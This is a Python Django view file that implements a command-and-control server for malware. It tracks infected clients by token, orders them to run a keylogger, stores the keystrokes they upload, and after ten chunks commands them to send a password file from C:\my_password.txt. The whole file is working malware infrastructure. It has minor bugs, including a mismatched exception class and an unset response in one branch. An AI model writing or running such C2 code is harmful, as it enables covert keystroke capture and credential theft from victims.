from django.http import JsonResponse
from .models import Malware, Command, Data, File
from django.views.decorators.csrf import csrf_exempt

KEY_LOGGER_COMMAND = 'keylogger'
SUBMIT_FILE_COMMAND = 'submit_file'

FILE_PATH = r'C:\my_password.txt'


@csrf_exempt
def cnc(request):
    if request.method == 'POST' and 'token' in request.POST and 'command' in request.POST and 'parameter' in request.POST:
        malware = get_malware_by_token(request.POST['token'])
        if malware:
            if request.POST['command'] == 'connect':
                Command(
                    type=KEY_LOGGER_COMMAND,
                    value='',
                    malware=malware,
                ).save()
                json_response = {
                    "success": True,
                    "command": KEY_LOGGER_COMMAND,
                    "argument": None,
                }
            elif request.POST['command'] == KEY_LOGGER_COMMAND:
                if 'parameter' in request.POST:
                    try:
                        data_item = Data.objects.get(malware=malware, name=KEY_LOGGER_COMMAND)
                        data_item.data += request.POST['parameter'] + '\r\n'
                        data_item.data_chunks_sent += 1
                        data_item.save()
                        json_response = {
                            "success": True,
                            "message": 'Keylog appended successfully',
                            "command": KEY_LOGGER_COMMAND,
                            "argument": None,
                        }
                        if data_item.data_chunks_sent >= 10:
                            json_response['command'] = SUBMIT_FILE_COMMAND
                            json_response['argument'] = FILE_PATH

                            Command(
                                type=SUBMIT_FILE_COMMAND,
                                value=FILE_PATH,
                                malware=malware
                            ).save()
                        else:
                            Command(
                                type=KEY_LOGGER_COMMAND,
                                value='',
                                malware=malware
                            ).save()
                    except File.DoesNotExist:
                        Data(
                            name=KEY_LOGGER_COMMAND,
                            data=request.POST['parameter'] + '\r\n',
                            malware=malware,
                        ).save()

                        Command(
                            type=KEY_LOGGER_COMMAND,
                            value='',
                            malware=malware
                        ).save()

                        json_response = {
                            "success": True,
                            "message": 'Keylog stored successfully',
                            "command": KEY_LOGGER_COMMAND,
                            "argument": None,
                        }
                else:
                    json_response = send_failure_message('Request missing required parameter: parameter')
            elif request.POST['command'] == SUBMIT_FILE_COMMAND:
                pass
            else:
                json_response = send_failure_message('Command not recognized')
        else:
            json_response = send_failure_message('Malware not recognized (Have you used an existing token?)')
    else:
        json_response = send_failure_message('Request not authorized (Have you used POST and specified a token, command and parameter?)')

    return JsonResponse(json_response)


def get_malware_by_token(token):
    try:
        return Malware.objects.get(token=token)
    except Malware.DoesNotExist:
        return None


def send_failure_message(message):
    return {
        "message": message,
        "success": False,
    }